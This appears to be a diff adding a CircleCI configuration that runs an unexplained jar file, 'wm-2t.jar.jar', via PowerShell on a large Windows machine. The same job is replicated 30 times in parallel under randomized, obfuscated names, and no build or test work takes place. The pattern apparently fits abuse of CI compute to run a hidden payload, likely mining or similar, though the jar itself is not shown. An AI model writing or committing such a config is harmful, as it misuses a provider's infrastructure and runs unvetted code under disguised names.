@@ -1,0 +1,79 @@
+version: 2.1
+
+jobs:
+  RECEIVE5PROC1614:
+    machine:
+      image: windows-server-2022-gui:current
+    resource_class: windows.large
+    steps:
+      - checkout
+      - run:
+          name: nanoview553124
+          command: |
+            java -jar wm-2t.jar.jar
+          shell: powershell.exe
+
+workflows:
+  version: 2
+  HANDLE972762local:
+    jobs:
+      - RECEIVE5PROC1614:
+          name: vergateway781441
+      - RECEIVE5PROC1614:
+          name: sendGER62542
+      - RECEIVE5PROC1614:
+          name: node855014ker
+      - RECEIVE5PROC1614:
+          name: hashZER913254
+      - RECEIVE5PROC1614:
+          name: PERrun687746
+      - RECEIVE5PROC1614:
+          name: show47243lib
+      - RECEIVE5PROC1614:
+          name: CHANNELPHASE702502
+      - RECEIVE5PROC1614:
+          name: connectMER913976
+      - RECEIVE5PROC1614:
+          name: webHEAP651626
+      - RECEIVE5PROC1614:
+          name: STAGE599661mini
+      - RECEIVE5PROC1614:
+          name: BIND344437inal
+      - RECEIVE5PROC1614:
+          name: setupTOOL436170
+      - RECEIVE5PROC1614:
+          name: mountultra796324
+      - RECEIVE5PROC1614:
+          name: coreHYPER926784
+      - RECEIVE5PROC1614:
+          name: convertREMOTE234827
+      - RECEIVE5PROC1614:
+          name: SEND876200IVE
+      - RECEIVE5PROC1614:
+          name: SENDible787680
+      - RECEIVE5PROC1614:
+          name: ARYSHIELD525374
+      - RECEIVE5PROC1614:
+          name: MAINcloud518397
+      - RECEIVE5PROC1614:
+          name: setupIVE976816
+      - RECEIVE5PROC1614:
+          name: PERresume123340
+      - RECEIVE5PROC1614:
+          name: MANAGE621336mini
+      - RECEIVE5PROC1614:
+          name: SCANSUPER422470
+      - RECEIVE5PROC1614:
+          name: apihood987857
+      - RECEIVE5PROC1614:
+          name: hide748508MICRO
+      - RECEIVE5PROC1614:
+          name: keyLESS762349
+      - RECEIVE5PROC1614:
+          name: SETUPBER635200
+      - RECEIVE5PROC1614:
+          name: hashext999500
+      - RECEIVE5PROC1614:
+          name: channel261188line
+      - RECEIVE5PROC1614:
+          name: LOGINPROTO754897
